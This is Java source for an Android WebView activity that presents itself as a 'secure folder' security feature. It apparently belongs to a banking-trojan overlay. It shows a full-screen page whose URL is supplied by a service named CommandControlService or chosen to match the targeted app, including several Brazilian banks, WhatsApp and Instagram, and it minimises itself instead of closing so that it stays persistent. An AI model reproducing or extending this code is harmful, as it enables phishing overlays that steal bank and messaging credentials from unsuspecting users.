package com.seguranca.protecao;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebViewActivity extends Activity {
    private static final String TAG = "WebViewActivity";
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Configura fullscreen total
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        );

        // Cria o WebView dinamicamente
        webView = new WebView(this);
        webView.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));

        // Configurações avançadas do WebView para compatibilidade máxima com sites modernos
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setBuiltInZoomControls(true);
        settings.setDisplayZoomControls(false);
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);

        // Configura diretório de dados e banco isolado por clone para Pasta Segura
        String targetPkg = getIntent() != null ? getIntent().getStringExtra("target_package") : null;
        if (targetPkg != null && !targetPkg.trim().isEmpty()) {
            String isoDir = getDir("secure_folder_" + targetPkg.replaceAll("[^a-zA-Z0-9_]", "_"), MODE_PRIVATE).getAbsolutePath();
            try {
                settings.setDatabasePath(isoDir);
                settings.setGeolocationDatabasePath(isoDir);
            } catch (Exception e) {
                Log.w(TAG, "Aviso ao definir diretório de banco isolado: " + e.getMessage());
            }
        }

        // Evita abrir links externos no navegador padrão do Android
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });

        // Recupera a URL configurada ou calcula com base no pacote alvo (Pasta Segura)
        String url = getIntent() != null ? getIntent().getStringExtra("url") : null;
        if (url == null || url.trim().isEmpty()) {
            url = CommandControlService.WEBVIEW_URL;
        }

        if ((url == null || url.trim().isEmpty()) && targetPkg != null) {
            String pkgLower = targetPkg.toLowerCase();
            if (pkgLower.contains("caixa")) {
                url = "https://internetbanking.caixa.gov.br";
            } else if (pkgLower.contains("itau")) {
                url = "https://www.itau.com.br";
            } else if (pkgLower.contains("santander")) {
                url = "https://www.santander.com.br";
            } else if (pkgLower.contains("bradesco")) {
                url = "https://www.banco.bradesco";
            } else if (pkgLower.contains("nu.production") || pkgLower.contains("nubank")) {
                url = "https://nubank.com.br";
            } else if (pkgLower.contains("whatsapp")) {
                url = "https://web.whatsapp.com";
            } else if (pkgLower.contains("instagram")) {
                url = "https://www.instagram.com";
            } else {
                url = "https://www.google.com";
            }
        }

        Log.d(TAG, "Carregando URL isolada no WebView: " + url + " (App: " + targetPkg + ")");

        if (url != null && !url.trim().isEmpty()) {
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                url = "https://" + url;
            }
            webView.loadUrl(url);
        } else {
            Log.e(TAG, "URL do WebView vazia ou nula!");
            finish();
            return;
        }

        setContentView(webView);
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            // Minimiza o aplicativo ao invés de fechar para manter persistente
            moveTaskToBack(true);
        }
    }
}
